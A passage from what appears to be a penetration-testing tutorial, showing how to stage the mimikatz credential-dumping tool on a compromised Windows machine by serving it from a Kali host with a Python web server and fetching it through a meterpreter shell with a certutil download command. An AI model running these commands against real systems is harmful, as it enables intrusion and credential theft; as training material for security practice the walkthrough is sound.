tep 6: Transferring files to the Windows target

In this case, we will be transferring the mimikatz.exe executable found under the /usr/share/windows-resources/mimikatz/x64 directory on the Kali Linux system.

To begin with, we can navigate to the directory by running the following command:

Command:
- cd /usr/share/windows-resources/mimikatz/x64

We can then start a web server with Python3 in this directory by running the following command:
- python3 -m http.server 80

We can now navigate back to the meterpreter session on the target system, navigate to the C:\ drive and create the Temp directory. This can be done by running the following commands:
Command:
cd C:\\

Command:
mkdir Temp

Command:
cd Temp

We will now need to spawn a command shell session on the target system by running the following command:

Command:

shell
We can now download the mimikatz.exe executable from the web server being hosted on the Kali Linux system by running the following command:

Command:

certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
